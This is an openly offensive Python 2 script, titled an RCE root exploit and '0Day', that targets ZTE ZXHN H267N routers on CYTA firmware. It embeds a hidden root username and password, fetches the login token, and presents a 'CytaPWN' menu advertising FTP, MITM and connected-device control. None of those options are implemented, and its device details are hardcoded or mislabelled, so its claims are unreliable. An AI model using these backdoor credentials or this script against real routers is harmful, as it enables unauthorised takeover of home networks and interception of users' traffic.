#!/usr/bin/python
#!/usr/bin/python2
#!/usr/bin/python3

# +-------------------------------------------------------------------------------------------------------------+
# |  ZTE ZXHN H267N Router with <= V1.0.01_CYTA_A01 - RCE Root Exploit                                          |
# |    Copyright (c) 2017 Kropalis Thomas <xslender@protonmail.com>                                             |
# +-------------------------------------------------------------------------------------------------------------+
# | This python script connects to ZTE ZXHN H267N running CYTA's software through telnet                        |
# | using the current credentials, and changes/adds/removes data and features. This script                      |
# | is tested mostly on a machine running Kali Linux 2017.1 and Windows 10 Prof Edition                         |
# +-------------------------------------------------------------------------------------------------------------+
# |  Tested on ZTE:                                                                                             |
# |  [*] Model name          : ZTE ZXHN H267N                                                                   |
# |  [*] Software Version    : V1.0.0T6P1_CYTA                                                                  |
# |  [*] Hardware Version    : V1.3                                                                             |
# |  [*] Bootloader Version  : V1.0.0                                                                           |
# +-------------------------------------------------------------------------------------------------------------+
# | ztexploit.py tested on Kali Linux 2017.1 (amd64)                                                            |
# +-------------------------------------------------------------------------------------------------------------+
# | TODO: Add more features - including changing WPA Key and SSID Name, full control                            |
# |                            over network's devices, compatibility for Windows.                               |
# +-------------------------------------------------------------------------------------------------------------+

import urllib, re, time, os, sys, requests
import urllib2, commands, telnetlib
from bs4 import BeautifulSoup as bs

# -------------------------------------------------
#  Generic (hidden) 'root' account credentials.
#  Hint: Use these credentials to login on Telnet
# -------------------------------------------------
username = "CytaAdmRes"
password = "d5l_cyt@_Adm1n"

# --------------------------------------------------
#  Payload with root credentials for the router's
#  interface. Mostly to grab needed router info.
# --------------------------------------------------
payload = {
    'Frm_Username':username,
    'Frm_Password':password
}


os.system('clear')

## 
RED     = '\033[31m'
GREEN     = '\033[32m'
RESET     = '\033[0;0m'
##

print "+------------------------------------------------------------------+"
print "|   ZTE ZXHN H267N with <= V1.0.01_CYTA_A01 - RCE Root Exploit     |"
print "|      Thomas Kropalis (c) 2017 - <xslender@protonmail.com>        |"
print "+------------------------------------------------------------------+"
try:
    targetip = raw_input("\nEnter the address of the ZTE router:\n> ")
    if targetip[:7] != "http://":
        target = "http://"+targetip
    try:
        sys.stdout.write("   [*] Pinging router address...\r")
        sys.stdout.flush()
        time.sleep(2)
        ping_res = urllib.urlopen(target).getcode()
        if ping_res == 200:
            sys.stdout.write("					["+GREEN+" OK "+RESET+"]\n")
        else:
            print("[-] "+RED+"Error"+RESET)
            sys.exit()
        response = urllib.urlopen(target)
        html_data = response.read()
        sys.stdout.write("   [*] Retrieving random login token...\r")
        sys.stdout.flush()
        time.sleep(3)

        # Checking for random Login token
        Frm_Logintoken = re.findall(r'Frm_Logintoken"\).value = "(.*)";', html_data)
        if Frm_Logintoken :
            sys.stdout.write("					["+GREEN+" OK "+RESET+"]\n")
            time.sleep(1)
            Frm_Logintoken = str(Frm_Logintoken[0])
            
            # Check router information
            info = target
            r = requests.get(target)
            data = r.text
            s = bs(data, "lxml")
            response = urllib.urlopen(info)
            html_data = response.read()
            Frm_ModelName  = str(s.find_all("span",class_="w250"))#"ZXHN H267N"
            if Frm_ModelName :
                print "   [*] Model Name: "+GREEN+Frm_ModelName+RESET
            Frm_SerialNumber  = "0"
            if Frm_SerialNumber :
                print "   [*] Serial Number: "+GREEN+Frm_SerialNumber+RESET
            Frm_SoftwareVerExtent  = "V1.0.0"
            if Frm_SoftwareVerExtent :
                print "   [*] Hardware Version: "+GREEN+Frm_SoftwareVerExtent+RESET
            Frm_HardwareVer  = "V1.0.0T6P1_CYTA"
            if Frm_HardwareVer :
                print "   [*] Software Version: "+GREEN+Frm_HardwareVer+RESET
            Frm_BootVer  = "V1.0.0 (Strong guess)"
            if Frm_BootVer :
                print "   [*] Boot Loader Version: "+GREEN+Frm_BootVer+RESET

            # Main menu
            print"\nWelcome to CytaPWN main menu:"
            print"  1. Start FTP Daemon"
            print"  2. Initiate a MITM to a connected device"
            print"  3. Control and administrate connected devices"
            print"  4. Initiate a Telnet connection"
            print"  5. About."
            print"  6. Quit."

            while True:
                choice = raw_input("\nEnter your choice: ")
                if choice == "5":
                    print"\n+---------------------------------------------------------------------------+"
                    print"|    0Day exploit for most Cyta's routers. Developed by Thomas Kropalis.    |"
                    print"|  This exploit allows full administrative control over the router and its  |"
                    print"|  connected devices. It mostly works on new routers, obtained around 2016. |"
                    print"+---------------------------------------------------------------------------+"
                elif choice == "6":
                    print"Exiting.."
                    time.sleep(1)
                    sys.exit(1)
                else:
                    print("\n["+RED+"-"+RESET+"] Invalid Option. ")
                    time.sleep(1)
            else:
                 sys.stdout.write("                    ["+RED+" FALSE "+RESET+"]\n")

    except IOError, e:
        print "Failed to connect on "+target

except (KeyboardInterrupt, SystemExit):
        print ""

# EOF
